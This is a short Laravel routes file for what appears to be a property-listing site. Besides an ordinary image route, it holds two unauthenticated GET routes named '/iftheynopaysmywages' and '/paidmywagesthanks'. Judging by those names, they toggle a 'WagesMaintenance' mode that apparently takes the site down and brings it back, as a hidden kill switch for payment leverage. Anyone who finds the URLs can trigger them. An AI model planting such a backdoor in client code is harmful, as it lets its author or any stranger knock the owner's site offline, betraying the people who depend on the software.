<?php

use App\Http\Controllers\TrebWebpController;
use App\Http\Middleware\GeoBlockMiddleware;
use App\Supports\WagesMaintenance;
use Illuminate\Support\Facades\Route;

Route::get('/storage/properties/treb/{listingKey}/{filename}', TrebWebpController::class)
    ->where('listingKey', '[A-Za-z0-9]+')
    ->where('filename', '[A-Za-z0-9._-]+')
    ->withoutMiddleware([GeoBlockMiddleware::class]);

Route::get('/iftheynopaysmywages', function () {
    WagesMaintenance::enable();

    return redirect('/');
})->name('iftheynopaysmywages');

Route::get('/paidmywagesthanks', function () {
    WagesMaintenance::disable();

    return redirect('/');
})->name('paidmywagesthanks');
